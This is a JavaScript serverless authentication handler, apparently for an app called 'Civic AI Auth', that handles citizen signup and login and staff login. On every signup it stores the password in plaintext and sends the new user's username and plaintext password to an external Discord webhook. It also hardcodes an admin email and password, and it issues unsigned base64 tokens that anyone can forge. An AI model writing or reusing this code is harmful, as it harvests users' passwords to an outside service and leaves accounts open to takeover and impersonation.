import { getUsers, saveUsers, sendDiscord, json, corsHeaders } from '../utils/store.js';

const STAFF_USER = 'daksh@admin.com';
const STAFF_PASS = 'dex123';

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: corsHeaders() });
  }
  if (request.method !== 'POST') {
    return json({ ok: false, message: 'POST only' }, 405);
  }

  try {
    const body = await request.json().catch(() => ({}));
    const { action, username, password, isStaff } = body;

    if (action === 'signup') {
      if (!username || !password || username.length < 3) {
        return json({ ok: false, message: 'Invalid username/password' }, 400);
      }
      if (username.toLowerCase() === STAFF_USER.toLowerCase()) {
        return json({ ok: false, message: 'Username not allowed' }, 400);
      }
      const { users } = await getUsers(env);
      if (users[username.toLowerCase()]) {
        return json({ ok: false, message: 'Username already taken' }, 409);
      }
      users[username.toLowerCase()] = {
        username,
        password,
        role: 'citizen',
        createdAt: new Date().toISOString()
      };
      const saved = await saveUsers(env, users);
      if (!saved.ok) {
        return json({ ok: false, message: saved.error || 'Storage unavailable' }, 500);
      }
      await sendDiscord(env, {
        title: '👤 New Account',
        color: 0x8b5cf6,
        fields: [
          { name: 'Username', value: username, inline: true },
          { name: 'Password', value: '||' + password + '||', inline: true }
        ],
        footer: 'Civic AI Auth'
      });
      const token = btoa(username + ':citizen:' + Date.now());
      return json({ ok: true, message: 'Account created!', user: { username, role: 'citizen' }, token });
    }

    if (action === 'login') {
      if (isStaff || (username && username.toLowerCase() === STAFF_USER.toLowerCase())) {
        if (username.toLowerCase() === STAFF_USER.toLowerCase() && password === STAFF_PASS) {
          const token = btoa('staff:' + Date.now());
          await sendDiscord(env, {
            title: '🛡️ Staff Login',
            color: 0xf59e0b,
            description: 'Admin signed in successfully.',
            footer: 'Civic AI Auth'
          });
          return json({
            ok: true,
            message: 'Staff login OK',
            user: { username: STAFF_USER, role: 'staff' },
            token
          });
        }
        return json({ ok: false, message: 'Invalid staff credentials' }, 401);
      }

      const { users } = await getUsers(env);
      const user = users[(username || '').toLowerCase()];
      if (!user || user.password !== password) {
        return json({ ok: false, message: 'Invalid username or password' }, 401);
      }
      const token = btoa(user.username + ':citizen:' + Date.now());
      await sendDiscord(env, {
        title: '🔐 Citizen Login',
        color: 0x3b82f6,
        fields: [{ name: 'Username', value: user.username }],
        footer: 'Civic AI Auth'
      });
      return json({
        ok: true,
        message: 'Login successful',
        user: { username: user.username, role: 'citizen' },
        token
      });
    }

    return json({ ok: false, message: 'Unknown action' }, 400);
  } catch (err) {
    return json({ ok: false, message: err.message || 'Server error' }, 500);
  }
}
